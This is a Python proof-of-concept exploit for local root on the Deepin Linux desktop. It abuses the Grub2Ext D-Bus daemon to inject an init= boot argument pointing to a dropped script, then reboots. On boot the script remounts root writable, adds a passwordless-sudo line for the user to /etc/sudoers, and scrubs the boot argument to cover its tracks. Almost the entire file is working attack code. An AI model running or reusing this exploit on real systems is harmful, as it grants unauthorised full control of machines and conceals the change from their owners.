#!/usr/bin/env python
#encoding=utf8

import os
import time
import dbus

username = os.getlogin()

grub  = '''GRUB_BACKGROUND="/boot/grub/themes/deepin/background.png"
GRUB_CMDLINE_LINUX_DEFAULT="splash quiet init=/var/tmp/hack.sh"
GRUB_DEFAULT="0"
GRUB_DISTRIBUTOR="`/usr/bin/lsb_release -d -s 2>/dev/null || echo Debian`"
GRUB_GFXMODE="1024x768"
GRUB_THEME="/boot/grub/themes/deepin/theme.txt"
GRUB_TIMEOUT="5"
'''

shell = '''#!/bin/bash
clear
echo "############################################"
echo "###### POC by King's Way <io[AT]stdio.io> ######"
echo "############################################"
echo 
echo "Start Dirty Work..."
mount -o rw,remount /
echo "%s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "Done!"
echo "Restore the boot args..."
sed -i 's/init=.*/"/g' /etc/default/grub
sed -i 's/init=.*//g' /boot/grub/grub.cfg
echo "Done!"
echo "Ready to exec init in 2 seconds..."
sleep 1
exec /sbin/init''' % (username)

print "Preparing the needed scripts..."
f = open('/var/tmp/hack.sh', 'w')
f.write(shell)
f.close()
os.chmod('/var/tmp/hack.sh', 0755)
print "Done!"
print "Calling the function of dde.daemon using D-BUS..."
bus = dbus.SystemBus()
interface = dbus.Interface(bus.get_object('com.deepin.daemon.Grub2Ext', '/com/deepin/daemon/Grub2Ext'), 'com.deepin.daemon.Grub2Ext')
interface.DoWriteGrubSettings(grub)
interface.DoGenerateGrubMenu()
print "Done!"
print "Ready to reboot in 3 seconds... Press Ctrl-C to stop this..."
time.sleep(3)
os.system('systemctl reboot -i')
